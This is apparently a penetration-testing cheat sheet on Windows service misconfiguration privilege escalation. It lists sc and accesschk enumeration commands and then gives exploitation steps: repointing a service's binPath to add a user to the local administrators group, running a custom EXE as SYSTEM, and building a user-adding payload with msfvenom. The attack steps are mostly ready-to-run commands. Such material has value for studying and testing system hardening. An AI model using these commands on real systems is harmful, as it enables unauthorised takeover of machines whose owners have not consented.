Windows services often run with high privileges and can be misconfigured to allow local p rivilege escalation. If a user has permission to modify the ``binPath`` of a service, they may be able to execute arbitart code with SYSTEM privilege

### Service Basics

```cmd
sc create up-server binPath= "C:\Windows\System32\PING.exe"
```

```cmd
sc qc up-server 
```
```cmd
sc query up-server 
```
```cmd
sc start up-server 
```

```cmd
sc config up-server binPath= "C:\Windows\System32\PING.exe 8.8.8.8"
```

```cmd
sc start up-server
```

--- 

### Enumeration Techniques

*   [Service security editor](https://filecroco.com/download-service-security-edtor)
*   PowerUp - Part of powersploit, used for service misconfiguration enumeration
*   Sysinternals accesschk.exe

```cmd
accesschk.exe -uvwc <service_name>
```

```cmd
accesschk.exe -uvwc up-server
```

---


### Service Permission Enumeration with ``accesschk``

Use ``accesschk.exe`` (from Sysinternals) to identify misconfigured services where low privileged users can **start**, **stop** or **modify** service configurations
checks all services (*) to see what permissions the user ``DevNull`` has - especially wheather they can  **start, stop** or **change** service configurations

```cmd
accesschk.exe -uwcv DevNull *
```

Verifies what could ``administrator`` group has over all services. Usefull to confirm expected behaviour for high-privileged group

```cmd
accesschk.exe -uwcv administrators *
```

Check what standard ``users`` group can do on all services. if ``users`` can modify services, this is a high-end misconfigurations

```cmd
accesschk.exe -uwcv users *
```

Checks what access ``Everyone`` group has to all services. If ``Everyone`` has write/start permissions. it likely leads to **privilege escalation**

```cmd
accesschk.exe -uwcv Everyone *
```

Displays detailed permissions (``-qv``) for the ``copyfile`` service. Use this to inspect a specific service's **discreationary access control list (DACL)**

```cmd
accesschk.exe /acceptable -uwcqv copyfile
```

#### Manual sc based enumeration

```cmd
sc query state= all | findstr "SERVICE_NAME:" >> C:\Users\Public\servicenames.txt
```

```cmd
FOR /F "tokens=2 delims= " %i in (C:\Users\Public\servicenames.txt) DO @echo %i >> C:\Users\Public\services.txt
```

```cmd
FOR /F %i in (C:\Users\Public\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Users\Public\path.txt
```


### Exploitation Steps

#### 1. Update binPath to malicious command or executable

```cmd
sc config <service_name> binPath= "net localgroup administrator DevNull /add"
```

```cmd
sc start <service_name>
```

#### 2. Point a service to a custom EXE

```cmd
sc config <service_name> binPath= "C:\Users\Public\test.exe
```

```cmd
sc start <service_name>
```
#### 3. Optional: Stop or Restart the service if needed

```cmd
sc stop <service_name>
```

```cmd
sc start <service_name>
```

#### 4. Payload generation

*   Create malicious EXE using ``msfvenom``

```bash
msfvenom -p windows/exec CMD="net localgroup administrators u1 /add" -f exe > Registry.exe
```

*   Replace original executive in binPath

